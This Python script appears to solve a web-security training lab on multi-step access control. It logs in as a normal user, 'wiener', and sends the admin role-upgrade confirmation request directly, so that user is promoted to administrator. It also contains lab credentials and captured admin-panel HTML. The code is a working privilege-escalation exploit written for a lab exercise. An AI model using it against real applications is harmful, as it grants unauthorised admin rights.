# Lab: Multi-step process with no access control on one step

import requests

base = "https://0a9c00ab0395e2bd8300fa1600e5009f.web-security-academy.net"
admin_session = requests.Session()

print("===========[step1] check if login page require csrf===============")
page_csrf_check = admin_session.get(f"{base}/login")
page_csrf_check_result=page_csrf_check.text
print(page_csrf_check_result)
# no csrft detected => keep going on

print("===========[step2] login with administrator credential===============")
page_admin=admin_session.post(f"{base}/login", data={"username": "administrator", "password": "admin"})
page_admin_result=page_admin.text
print(page_admin_result)
'''
Found "Admin panel" ==> /admin
<a href="/admin">Admin panel</a><p>|</p>
'''

print("===========[step3] Access Admin panel===============")
page_admin_panel=admin_session.get(f"{base}/admin", allow_redirects=False)
page_admin_panel_result=page_admin_panel.text
print(page_admin_panel_result)
'''
                    <form style='margin-top: 1em' class='login-form' action='/admin-roles' method='POST'>
                        <label>User</label>
                        <select name='username'>
                            <option value='carlos'>carlos (NORMAL)</option>
                            <option value='administrator'>administrator (ADMIN)</option>
                            <option value='wiener'>wiener (NORMAL)</option>
                        </select>
                        <button class='button' name='action' value='upgrade' type='submit'> Upgrade user </button>
                        <button class='button' name='action' value='downgrade' type='submit'> Downgrade user </button>
                    </form>
'''

print("===========[step4] upgrade carlos (as admin)===============")
page_upgrade = admin_session.post(f"{base}/admin-roles", data={"username": "carlos", "action": "upgrade"}, allow_redirects=False)
print(page_upgrade.status_code, page_upgrade.text)


print("===========[step5] confirm upgrade carlos (as admin)===============")
page_confirm = admin_session.post(f"{base}/admin-roles", data={"action": "upgrade", "confirmed": "true", "username": "carlos"}, allow_redirects=False)
print(page_confirm.status_code)
print(page_confirm.text)

print("===========[step6] login non-admin account===============")
user_session = requests.Session()
page_user=user_session.post(f"{base}/login", data={"username": "wiener", "password": "peter"})
page_user_result=page_user.text
print(page_user_result)

print("===========[step7] [step7] exploit: confirm step directly (as wiener)===============")
page_exploit_confirm = user_session.post(f"{base}/admin-roles", data={"action": "upgrade", "confirmed": "true", "username": "wiener"}, allow_redirects=False)
print(page_exploit_confirm.status_code)
print(page_exploit_confirm.text)